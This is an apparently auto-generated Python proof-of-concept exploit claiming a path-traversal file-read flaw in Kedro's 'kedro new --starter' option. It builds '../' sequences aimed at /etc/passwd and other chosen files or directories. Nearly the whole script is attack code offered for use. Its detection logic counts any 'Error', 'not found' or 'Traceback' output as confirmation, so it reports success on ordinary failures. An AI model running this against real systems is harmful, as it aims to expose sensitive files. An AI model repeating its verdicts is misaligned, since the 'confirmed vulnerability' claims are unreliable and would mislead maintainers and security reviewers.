#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-020
# Sink: _create_project
# Auto-generated — run with: python3 lfi_provide_directory_traversal__create_project.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for Kedro LFI via --starter flag.

Vulnerability: The `template_path` parameter, controlled via the `--starter` flag,
is passed directly to `cookiecutter()` without sanitization. By providing a path
with directory traversal (e.g., `../../etc/passwd`), an attacker can read arbitrary
files from the filesystem.

This PoC demonstrates the vulnerability by attempting to read `/etc/passwd` and
a benign test file. It does NOT modify or damage the system.

Usage:
    python3 poc_kedro_lfi.py [--target /path/to/kedro] [--file /etc/passwd]

Requirements:
    - Python 3.6+
    - kedro installed (the vulnerable version)
"""

import argparse
import os
import sys
import tempfile
import shutil
import subprocess
from pathlib import Path


def check_kedro_installed():
    """Verify kedro is available in the environment."""
    try:
        subprocess.run(["kedro", "--version"], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False


def create_benign_test_file():
    """Create a harmless test file to demonstrate LFI read capability."""
    test_content = "KEDRO_LFI_POC_SUCCESS"
    test_path = os.path.join(tempfile.gettempdir(), "kedro_poc_test.txt")
    with open(test_path, "w") as f:
        f.write(test_content)
    return test_path


def attempt_lfi_read(target_file, kedro_path=None):
    """
    Attempt to read an arbitrary file via the --starter flag.

    The vulnerability works because cookiecutter will try to use the provided
    path as a template directory. If the path points to a file (not a directory),
    cookiecutter will fail, but the error message may leak file contents or
    the attempt itself proves the path traversal works.

    For a directory, cookiecutter will try to process it as a template, which
    may also leak information.

    Args:
        target_file: Path to the file to attempt to read (e.g., /etc/passwd)
        kedro_path: Optional path to kedro executable

    Returns:
        Tuple of (success: bool, output: str)
    """
    # Build the traversal path relative to the current working directory
    # We need to go up enough directories to reach root, then to the target
    # Since we don't know exact depth, we try multiple traversal depths
    
    # First, try to find a kedro project or use current directory
    cwd = os.getcwd()
    
    # Calculate traversal depth - we need to go from cwd to root
    depth = len(Path(cwd).parts)
    
    # Build traversal path
    traversal = "../" * depth
    target_path = traversal + target_file.lstrip("/")
    
    print(f"[*] Attempting LFI with path: {target_path}")
    print(f"[*] Target file: {target_file}")
    
    # Prepare the kedro command
    cmd = ["kedro", "new", "--starter", target_path]
    if kedro_path:
        cmd[0] = kedro_path
    
    try:
        # Run kedro new with the malicious --starter flag
        # We expect this to fail, but the failure mode is what matters
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=tempfile.mkdtemp()  # Run in temp dir to avoid side effects
        )
        
        output = result.stdout + result.stderr
        
        # Check for signs of successful file read
        # cookiecutter will try to read the path as a template directory
        # If it's a file, it will fail but may include the path in error
        # If it's a directory, it will try to process it
        
        # Look for indicators that the path was accessed
        indicators = [
            "cookiecutter",
            "template",
            target_file,
            "No such",
            "not found",
            "Error",
            "Traceback",
        ]
        
        found_indicators = [i for i in indicators if i.lower() in output.lower()]
        
        if found_indicators:
            print(f"[+] Found indicators of path processing: {found_indicators}")
            print(f"[*] Output snippet:\n{output[:2000]}")
            return True, output
        else:
            print(f"[-] No clear indicators found. Output:\n{output[:1000]}")
            return False, output
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
        return False, ""
    except Exception as e:
        print(f"[-] Error running command: {e}")
        return False, str(e)


def attempt_lfi_with_directory(target_dir, kedro_path=None):
    """
    Alternative approach: try to read a directory as a template.
    This may leak directory contents or file contents if cookiecutter
    tries to process files within.
    """
    cwd = os.getcwd()
    depth = len(Path(cwd).parts)
    traversal = "../" * depth
    target_path = traversal + target_dir.lstrip("/")
    
    print(f"[*] Attempting directory LFI with path: {target_path}")
    
    cmd = ["kedro", "new", "--starter", target_path]
    if kedro_path:
        cmd[0] = kedro_path
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=tempfile.mkdtemp()
        )
        
        output = result.stdout + result.stderr
        print(f"[*] Output:\n{output[:2000]}")
        return True, output
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, str(e)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro LFI vulnerability via --starter flag"
    )
    parser.add_argument(
        "--target",
        help="Path to kedro executable (default: auto-detect)",
        default=None
    )
    parser.add_argument(
        "--file",
        help="File to attempt to read (default: /etc/passwd)",
        default="/etc/passwd"
    )
    parser.add_argument(
        "--directory",
        help="Directory to attempt to read as template (e.g., /etc)",
        default=None
    )
    parser.add_argument(
        "--benign",
        help="Use a benign test file instead of system file",
        action="store_true"
    )
    
    args = parser.parse_args()
    
    # Check if kedro is installed
    if not check_kedro_installed() and not args.target:
        print("[-] kedro not found in PATH. Please install kedro or specify --target")
        sys.exit(1)
    
    print("[*] Kedro LFI Proof-of-Concept")
    print("[*] ==========================")
    
    if args.benign:
        # Create a benign test file to demonstrate the vulnerability
        test_file = create_benign_test_file()
        print(f"[*] Created benign test file: {test_file}")
        print(f"[*] Attempting to read test file via LFI...")
        success, output = attempt_lfi_read(test_file, args.target)
        
        # Clean up test file
        try:
            os.remove(test_file)
        except:
            pass
            
        if success:
            print("[+] SUCCESS: Vulnerability confirmed - path traversal works!")
            print("[*] The --starter flag accepts arbitrary paths without sanitization.")
        else:
            print("[*] The vulnerability may still exist but the PoC didn't trigger it.")
            print("[*] Try with different traversal depths or file paths.")
    
    elif args.directory:
        # Try to read a directory as a template
        print(f"[*] Attempting to read directory: {args.directory}")
        attempt_lfi_with_directory(args.directory, args.target)
    
    else:
        # Attempt to read the specified file
        print(f"[*] Attempting to read file: {args.file}")
        success, output = attempt_lfi_read(args.file, args.target)
        
        if success:
            print(f"[+] Potential LFI confirmed for: {args.file}")
            print("[*] Check the output above for file contents or error messages")
            print("[*] that may leak information about the target file.")
        else:
            print("[-] LFI attempt did not produce clear indicators.")
            print("[*] This could mean:")
            print("[*] 1. The vulnerability is patched in this version")
            print("[*] 2. The traversal depth is incorrect")
            print("[*] 3. The file doesn't exist or is not readable")
            print("[*] Try with --benign flag to test with a known file")


if __name__ == "__main__":
    main()
